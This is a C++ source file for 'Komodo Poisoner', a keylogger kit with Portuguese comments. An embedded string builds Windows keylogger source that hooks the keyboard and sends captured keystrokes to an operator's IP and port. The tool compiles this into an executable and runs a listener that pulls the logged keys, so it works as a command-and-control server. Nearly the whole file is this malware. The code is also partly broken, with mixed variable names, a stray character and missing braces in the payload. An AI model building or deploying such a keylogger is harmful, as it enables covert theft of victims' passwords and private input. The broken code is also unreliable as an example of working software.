#include <string>
#include <thread>
#include <iostream>

//Socket Libs:   
#include <sys/socket.h>                                    
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>

//Bilbiotecas utilizadas no builder:
#include <fstream>

//Header de configurações
#include "./config.h"

//Constantes:
const int command_size = 100;

//Variaveis utilizadas para receber as informaçôes para a conexão.
std::string ip = "";
std::string _port = "";
int port = 0;
int i = 0;
bool parameters_found = false;
bool hifen_encontrado = false;
bool estado_de_conexao = false;

//Variaveis utilizadas no modulo de conexão:
int server_fd, new_socket, valread;
struct sockaddr_in address;
int opt = 1;
int addrlen = sizeof(address);
char buffer[1024] = {0};
const char* hello = "Hello from server";

//Variaveis utilizadas no builder: encripitar isso~>
std::string build_content_1 = "#include <winsock2.h>\n#include <iostream>\n#include <thread>\n#include <string>\n#include <windows.h>\nint sResult = 0;\nstd::string log = \"\";WSADATA wsaData;SOCKET clientSocket = INVALID_SOCKET;struct sockaddr_in serverAddress;char buffer[1024];LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam){KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);switch (wParam){case WM_KEYDOWN:char c = MapVirtualKey(s->vkCode, MAPVK_VK_TO_CHAR); log += c;break;}return CallNextHookEx(NULL, nCode, wParam, lParam);        }void connection();void k_log();int main(){std::thread t_connection(connection);std::thread t_k_log(k_log);t_connection.join();t_k_log.join();return 0;}void connection(){if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {std::cerr << \"Falha na inicialização do Winsock\" << std::endl;}if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {std::cerr << \"Falha na criação do socket\" << std::endl;WSACleanup();}serverAddress.sin_family = AF_INET;serverAddress.sin_port = htons(";
std::string build_content_2 = ");\nserverAddress.sin_addr.s_addr = inet_addr(\"";
std::string build_content_3 = "\");if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {std::cerr << \"Erro na conexão com o servidor\" << std::endl;closesocket(clientSocket);WSACleanup();}while(1){memset(buffer, 0, 1024);  if (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {std::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;closesocket(clientSocket);WSACleanup();}if(buffer[0] == \'R\'){std::cout << \"Enviando \" << log << \" ao servidor\\n\";sResult = send(clientSocket, log.c_str(), strlen(log.c_str()), 0);log = \"\";if (sResult < 0) {std::cerr << \"Erro no envio de dados ao servidor\" << std::endl;closesocket(clientSocket);WSACleanup();}else{}std::cout << \"Resposta do servidor: \" << buffer << std::endl}closesocket(clientSocket);WSACleanup();void k_log(){HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHook, 0, 0);MSG message;while (GetMessage(&message, NULL, NULL, NULL) > 0){TranslateMessage(&message);DispatchMessage(&message);}UnhookWindowsHookEx(kbd);}";

//Declaração das funçôes
int port_extractor();
int ip_extractor();
int function_loader(char comando[command_size]);
int open_listener();
int builder();
void help_menu(int menu_id);

int main(){
  char comando[command_size];
  help_menu(0);
  std::cout << "\n$: ";
  std::cin.getline(command, command_size);

  if(function_loader(comando) != 0){
    std::cout << "Erro ao extrair os parâmetros\n";
  }

  return 0;
}//Fim do main

void help_menu(int menu_id){
  switch(menu_id){
    case 0:
      system("clear");
      std::cout << "Komodo Poisoner\n";
      std::cout << "\nComandos:\n";
      std::cout << "listener -p <PORT>\nbuilder -h <IP> -p <PORT>\n";
      std::cout << "\nParâmetros: \n";
      std::cout << "-h: indica o host (IP ou DDNS) do servidor\n";
      std::cout << "-p: indica a porta a ser utilizada para a conexão\n";
      std::cout << "Para obter ajuda\n";
    break;
  }
}

int port_extractor(){

  hifen_encontrado = false;

  do{
    if(command[i] == '-'){
      hifen_encontrado = true;
    }else{
      ++i;
    }

    if(i >= 100){
      std::cout << "Sintaxe incorreta\n";
      break;
    }
  }while(hifen_encontrado != true);

  i += 3;

  for(int j = 0; j < 4; j++){
    if(command[i] != ' '){
      _port += command[i];
    }
    ++i;

  }
  port = std::stoi(_port);
  return 0;
}

int ip_extractor(){

  hifen_encontrado = false;

  do{
    if(command[i] == '-'){
      hifen_encontrado = true;
    }else{
      ++i;
    }

    if(i >= 100){
                        std::cout << "Sintaxe incorreta\n";
                        break;
                }
        }while(hifen_encontrado != true);

        i += 3;


        for(int j = 0; j < 15; j++){
                if(command[i] == '-'){
                        break;
                }

                if(command[i] != ' '){
                        ip += command[i];
                }
                ++i;
        }
return 0;
}

int function_loader(char comando[command_size]){

        if(comando[0] == 'l'){
                if(port_extractor() == 0){
                        std::cout << "Porta extraida com sucesso\n";
                }else{
                7       std::cout << "Erro ao extrair a porta\n";
                }
                  std::cout << "Iniciando Listener\n";
                        std::thread listener(open_listener);
                        listener.join();

                }else if(comando[0] == 'b'){
                        if(ip_extractor() == 0){
                                std::cout << "IP extraido com sucesso";
                        }else{
                                std::cout << "Erro ao extrair o IP\n";
                        }

                if(port_extractor() == 0){
                        std::cout << "Porta extraida com sucesso\n";
                }else{
                        std::cout << "Erro ao extrair a porta\n";
                }
                std::cout << "Chamando Builder\n";
                builder();

                std::cout << "\nDeseja iniciar o Listener? (s/n)\n";
                std::cout << "$Builder$: ";
                memset(comando, 0, command_size);
                std::cin.getline(command, command_size);
                if(command[0] == 's' || command[0] == 'S'){
                        std::thread listener(open_listener);
                        listener.join();
                }else{
                        exit(1);
                }

                parameters_found = true;

                }else{
                        //Não encontrou os parâmetros
                        return 1;
                }
return 0;

}

int open_listener()
{

    // Criando o socket
        std::cout << "Criando socket\n";
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        std::cerr << "Falha na criação do socket" << std::endl;
        return -1;
    }

        std::cout << "Configurando Socket\n";
    // Configurando opções do socket
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        std::cerr << "Erro na configuração das opções do socket" << std::endl;
        return -1;
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);

    // Vinculando o socket a um endereço
        std::cout << "Vinculando (binding) o socket\n";
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        std::cerr << "Erro na vinculação do socket a um endereço" << std::endl;
        return -1;
    }

    // Aguardando conexões
        std::cout << "Aguardando pelo client\n";
    if (listen(server_fd, 3) < 0) {
        std::cerr << "Erro na espera por conexões" << std::endl;
        return -1;
    }

    // Aceitando a conexão de um cliente
    if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
        std::cerr << "Erro na aceitação da conexão" << std::endl;
        return -1;
    }

        estado_de_conexao = true;
        system("clear");
        std::cout << "Cliente conectado com sucesso\n";

        //Caso o listener seja iniciado, o programa não fecha e segue:
        std::cout << "Listener\n";
        std::cout << "Instruções:\nklog -h\nscreencast -h\nexit a qualquer momento para sair.\n";

        while(estado_de_conexao == true){
                memset(command, 0, command_size);
                std::cout << "\n$listener$: ";
                std::cin.getline(command, command_size);

                if(command[0] == 'k'){
                        //Key logger
                        hifen_encontrado = false;
                        i = 0;
                        do{
                                if(command[i] == '-'){
                                hifen_encontrado = true;
                                }else{
                                        ++i;
                                }

                                if(i >= 100){
                                        std::cout << "Sintaxe incorreta\n";
                                        break;
                                }

                        }while(hifen_encontrado != true);

                        ++i;

                        if(command[i] == 'h'){
                                system("clear");
                                std::cout << "\nklog <start/stop> <Parâmetros do start>\n";
                                std::cout << "--begin        Inicia o Keylogger\n";
                                std::cout << "--end           Para o Keylogger\n";
                                std::cout << "-t            Mostra a input do usuário diretamente na tela do terminal\n";
                                std::cout << "-o \"nome.txt\" Grava a input capturada em um arquivo\n\n";
                        }

                        ++i;
                        if(command[i] == 'b')
                        {
                                std::cout << "Usuário escolheu a opção begin\n";

                                hifen_encontrado = false;
                                do{
                                        if(command[i] == '-')
                                        {
                                                hifen_encontrado = true;
                                        }else
                                        {
                                                ++i;
                                        }

                                        if(i >= 100)
                                        {
                                                std::cout << "Sintaxe incorreta\n";
                                                break;
                                        }

                                }while(hifen_encontrado != true);

                                ++i;
                                if(command[i] == 't')
                                {
                                        while(estado_de_conexao == true)
                                        {
                                                std::cout << "Imprimir no terminal\n";
                                                // Enviando request de dados ao client:
                                                send(new_socket, "REQUEST_FLAG", 12, 0 );
                                                valread = read(new_socket, buffer, 1024);
                                                std::cout << buffer;

                                                // Esperando antes de requisitar o próximo buffer
                                                sleep(klog_update_time);
                                        }

                                std::cout << "A conexão foi fechada nesse caraio de porra\n";

                                }else if(command[i] == 'o')
                                {
                                        std::cout << "Gravar em arquyivo\n";
                                        // Recebendo dados do cliente
                                        valread = read(new_socket, buffer, 1024);
                                        std::cout << buffer << std::endl;

                                        // Enviando resposta ao cliente
                                        send(new_socket, hello, strlen(hello), 0);
                                        std::cout << "Resposta enviada ao cliente" << std::endl;

                                }else
                                {
                                        std::cout << "Sintaxe incorreta\n";
                                }
                        }

                }else if(command[0] == 's'){
                        //ScreenCast

                }else if(command[0] == 'e'){
                        exit(1);
                }else{
                        std::cout << "Sintaxe incorreta: " << command[i];
                }
        }
        //FIm do while

        // Fechando o socket
        close(new_socket);
        close(server_fd);
        return 0;
}


int builder()
{
        std::ofstream arquivocpp("tempf_build.cpp");

        arquivocpp << build_content_1;
        arquivocpp << port;
        arquivocpp << build_content_2;
        arquivocpp << ip;
        arquivocpp << build_content_3;

        arquivocpp.close();

        std::ofstream call_compiler("tempf_call_compiller.sh");
        call_compiler << "i686-w64-mingw32-g++ tempf_build.cpp -o build.exe -lws2_32 -static-libgcc -static-libstdc++ -std=c++11";
        call_compiler.close();
        system("chmod +x ./tempf_call_compiller.sh && ./tempf_call_compiller.sh");

        std::cout << ".exe gerado com sucesso\n";
        system("rm tempf*");
return 0;
}
